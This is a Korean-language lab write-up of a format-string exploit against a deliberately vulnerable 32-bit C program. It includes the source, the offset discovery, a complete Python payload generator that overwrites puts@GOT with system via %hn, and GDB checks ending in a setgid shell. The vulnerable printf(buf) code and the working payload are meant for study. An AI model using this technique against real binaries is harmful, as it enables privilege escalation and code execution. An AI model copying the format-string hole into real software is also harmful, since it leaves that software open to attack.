# fsb-1input-got-rce

## 1. 개요

이 실습은 **Format String Vulnerability(FSB)** 를 이용해
**GOT(Global Offset Table)를 overwrite**하고,
**단 한 번의 입력으로 RCE(Remote Code Execution)를 달성**하는 것을 목표로 한다.

* Buffer Overflow 없음
* saved RET overwrite 안함
* **printf의 fsb만으로 쉘 획득**

즉, `printf(buf)`로 `puts@GOT`를 `system`으로 덮고, 이후 `puts(buf)` 호출을 `system(buf)`으로 변환한다.

---

## 2. 실습 환경

* Architecture: x86 (32-bit)
* OS: Ubuntu 24.04
* ASLR: OFF
* PIE: Disabled
* NX: Enabled → 쉘코드 주입 불가 (libc 재사용 강조)
* Stack Canary: Disabled
* RELRO: Partial RELRO → GOT writable

---

## 3. 취약 코드

```c
// filename: vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char buf[200];

    setregid(getegid(), getegid());
    setvbuf(stdout, NULL, _IONBF, 0);

    puts("input:");
    fgets(buf, sizeof(buf), stdin);

    printf(buf);   // Format String Vulnerability
    puts(buf);     // GOT overwrite 이후 system(buf)로 변환됨

    return 0;
}
```

### 취약점 요약

* `printf(buf)`
  * 사용자 입력이 포맷 문자열로 해석됨
  * `%n`, `%hn`을 이용한 **임의 주소 쓰기 가능**
* `puts(buf)`
  * 이후 호출되는 함수
  * GOT overwrite의 **트리거 역할**

---

## 4. 공격 전략

### 4.1 전체 흐름

1. `printf(buf)`에서 Format String Vulnerability 발생
2. `%hn`을 이용해 `puts@GOT`를 `system` 주소로 overwrite
3. 같은 실행 흐름에서 `puts(buf)` 호출
4. 실제 실행은 `system(buf)`
5. 입력 문자열에 `/bin/sh` 포함 → 쉘 획득

### 4.2 왜 입력 1회로 쉘 획득이 가능한가?

* `printf`와 `puts`가 **같은 buf**를 사용
* 하나의 입력에 다음을 모두 포함:

  * `/bin/sh` (system 인자)
  * GOT overwrite용 주소
  * `%hn` 포맷 스트링

또한 `/bin/sh #` 형태를 사용하여
뒤에 이어지는 바이너리 데이터와 포맷 문자열을
**쉘에서 주석으로 처리**하도록 만든다.

---

## 5. GOT overwrite 대상

```bash
$ objdump -R vuln | grep puts
0804c010 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

* overwrite target: `puts@GOT`
* overwrite value: `system@libc`

---

## 6. Format String offset

입력:

```
AAAA.%x.%x.%x.%x.%x.%x.%x
```

출력 예:

```
AAAA.c8.f58a95c0.0.f58fffe8.f568f33c.41414141.2e78252e
```

→ `AAAA (0x41414141)`가 6번째 위치
→ **offset = 6**

---

## 7. payload 구성

### 핵심 포인트

* `/bin/sh #` : system 인자 + 주석 처리
* 4바이트 정렬을 위한 padding
* `puts@got`, `puts@got+2`를 printf 인자로 배치
* `%hn`을 이용해 2바이트씩 system 주소 조립

### payload.py

```python
#!/usr/bin/env python3
import sys, struct

puts_got = 0x0804c010
system   = 0xf7dc5430
base     = 9      # printf 기준 puts@got 인자 위치

lo = system & 0xffff
hi = (system >> 16) & 0xffff

cmd = b"/bin/sh #"      # 9 bytes
pad_align = b"A" * ((4 - (len(cmd) % 4)) % 4)

payload  = cmd + pad_align
payload += struct.pack("<I", puts_got)
payload += struct.pack("<I", puts_got + 2)

count = len(payload)

pad1 = (lo - count) % 0x10000
if pad1:
    payload += f"%{pad1}c".encode()
    count += pad1
payload += f"%{base}$hn".encode()

pad2 = (hi - count) % 0x10000
if pad2:
    payload += f"%{pad2}c".encode()
    count += pad2
payload += f"%{base+1}$hn".encode()

payload += b"\n"
sys.stdout.buffer.write(payload)
```

페이로드 구조:
```
"/bin/sh #" + align_pad
[ puts@got ][ puts@got+2 ]
%pad1c %9$hn
%pad2c %10$hn
```

스택 레이아웃:
```
낮은 주소
+---------------+
│    "/bin"     │  ← system() 인자 시작
+---------------+
│    "/sh "     │
+---------------+
│    "#AAA"     │  ← 주석 + 4바이트 정렬(pad_align)
+---------------+
│   0x0804c010  │  ← puts@GOT
+---------------+
│   0x0804c012  │  ← puts@GOT + 2
+---------------+
│   "%21532c"   │  ← 출력 바이트 수 조절 (lo)
+---------------+
│    "%9$hn"    │  ← puts@GOT (하위 2바이트 write)
+---------------+
│   "%41900c"   │  ← 출력 바이트 수 조절 (hi)
+---------------+
│   "%10$hn"    │  ← puts@GOT+2 (상위 2바이트 write)
+---------------+
│     "\n"      │
+---------------+
높은 주소
```

### 실행 흐름

```
printf(buf)
 ├─ "/bin/sh #" 출력            → count 증가
 ├─ %21532c                     → count = lo(system)
 ├─ %9$hn                       → puts@GOT 하위 2바이트 overwrite
 ├─ %41900c                     → count = hi(system)
 ├─ %10$hn                      → puts@GOT 상위 2바이트 overwrite
 └─ printf 종료

puts(buf)
 └─ GOT hijack → system(buf)
     └─ system("/bin/sh # ...") → 쉘
```

> **노트 ── system(buf)에서 # 주석처리**
> 
> glibc의 `system()` 함수는 내부적으로 다음과 같은 형태로 동작한다.
> ```
> execl("/bin/sh", "sh", "-c", buf, NULL);
> ```
> 즉, `system(buf)`는 `/bin/sh -c <buf>` 를 실행하는 것과 같다.
>
> 
> 또한, POSIX shell에서 #은 주석을 의미하므로 페이로드에서 # 이하는 무시된다.
>
> 따라서 다음과 같은 형태로 해석된다.
> ```
> /bin/sh #AAA<binary><format string>
>   → /bin/sh
> ```

---

## 8. 결과

### 8.1 GDB 관찰

#### GOT write 확인

``` gdb
watch *(unsigned short*)0x0804c010
watch *(unsigned short*)0x0804c012
```

* 첫 `%hn` → 하위 2바이트 overwrite
* 두 번째 `%hn` → 상위 2바이트 overwrite

#### puts 호출 확인

``` gdb
b puts@plt
```

* GOT overwrite 이후 `puts@plt` → `system`으로 점프

#### puts@plt 이후 점프 확인

``` gdb
si
```

실행 화면:
![gdb](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-1input-got-rce/05.png)

### 8.2 결과

![result](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-1input-got-rce/06.png)

* setgid root 쉘 획득
* 단 한 번의 입력으로 RCE 달성

---

## 9. 정리

이 실습은 다음을 보여준다.

* Format String Vulnerability의 실질적 위험성
* GOT overwrite를 통한 control flow hijacking
* ret overwrite 없이도 가능한 RCE
* printf 내부 동작과 `%hn`의 실제 메모리 영향

**Format String → GOT Hijack → RCE**
